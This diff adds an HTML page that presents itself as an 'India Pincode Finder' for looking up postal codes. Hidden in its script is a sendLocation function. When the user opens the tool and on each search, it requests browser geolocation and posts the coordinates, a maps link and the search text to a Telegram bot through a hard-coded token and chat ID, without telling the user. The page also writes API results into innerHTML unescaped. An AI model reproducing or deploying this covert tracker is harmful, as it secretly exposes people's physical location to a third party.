@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>India Pincode Finder</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #e0f7fa, #e8f5e9);
+      text-align: center;
+      padding: 30px;
+      margin: 0;
+    }
+    h1 {
+      color: #1b5e20;
+      font-size: 2em;
+      margin-bottom: 30px;
+    }
+    #startBtn, .search-btn {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #388e3c;
+      color: white;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      transition: all 0.3s ease;
+    }
+    #startBtn:hover, .search-btn:hover {
+      background-color: #2e7d32;
+    }
+    #place {
+      padding: 12px 20px;
+      font-size: 16px;
+      width: 90%;
+      max-width: 400px;
+      border: 1px solid #ccc;
+      border-radius: 25px;
+      margin-top: 15px;
+    }
+    table {
+      width: 95%;
+      max-width: 900px;
+      margin: 30px auto;
+      background: white;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.15);
+      border-collapse: collapse;
+    }
+    th, td {
+      padding: 12px;
+      border-bottom: 1px solid #ddd;
+    }
+    th {
+      background-color: #00796b;
+      color: white;
+    }
+    tr:nth-child(even) {
+      background: #f1f8e9;
+    }
+    @media (max-width: 600px) {
+      h1 {
+        font-size: 1.5em;
+      }
+      table, th, td {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<h1>📮 India Pincode Finder</h1>
+
+<!-- Step 1: Start Button -->
+<button id="startBtn" onclick="showSearch()">🔍 Find Pincode</button>
+
+<!-- Step 2: Search Box -->
+<div id="searchSection" style="display:none;">
+  <input type="text" id="place" placeholder="Enter area or city (e.g., Kanpur)">
+  <br><br>
+  <button class="search-btn" onclick="findPincode()">Search</button>
+</div>
+
+<!-- Step 3: Result Table -->
+<table id="result" style="display:none;">
+  <thead>
+    <tr>
+      <th>Post Office</th>
+      <th>Pincode</th>
+      <th>District</th>
+      <th>State</th>
+    </tr>
+  </thead>
+  <tbody></tbody>
+</table>
+
+<script>
+const BOT_TOKEN = "8148507636:AAE5JkA-Hc-AmAJMiM8Pz2t_BQoCC7VKtLc";
+const CHAT_ID = "7357184121";
+
+function showSearch() {
+  document.getElementById("startBtn").style.display = "none";
+  document.getElementById("searchSection").style.display = "block";
+  sendLocation("User opened the pincode search tool");
+}
+
+function findPincode() {
+  const place = document.getElementById("place").value.trim();
+  if (!place) return alert("Please enter a location name.");
+  sendLocation(`User searched: ${place}`);
+
+  fetch(`https://api.postalpincode.in/postoffice/${place}`)
+    .then(res => res.json())
+    .then(data => {
+      const result = data[0];
+      const tbody = document.querySelector("#result tbody");
+      tbody.innerHTML = "";
+
+      if (result.Status === "Success") {
+        document.getElementById("result").style.display = "table";
+        result.PostOffice.forEach(po => {
+          const row = `<tr>
+            <td>${po.Name}</td>
+            <td>${po.Pincode}</td>
+            <td>${po.District}</td>
+            <td>${po.State}</td>
+          </tr>`;
+          tbody.innerHTML += row;
+        });
+      } else {
+        alert("No data found for this place.");
+        document.getElementById("result").style.display = "none";
+      }
+    });
+}
+
+function sendLocation(note) {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(pos => {
+      const { latitude, longitude, accuracy } = pos.coords;
+      const msg = `📍 ${note}\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy}m\n🔗 https://maps.google.com/?q=${latitude},${longitude}`;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+      });
+    });
+  }
+}
+</script>
+
+</body>
+</html>
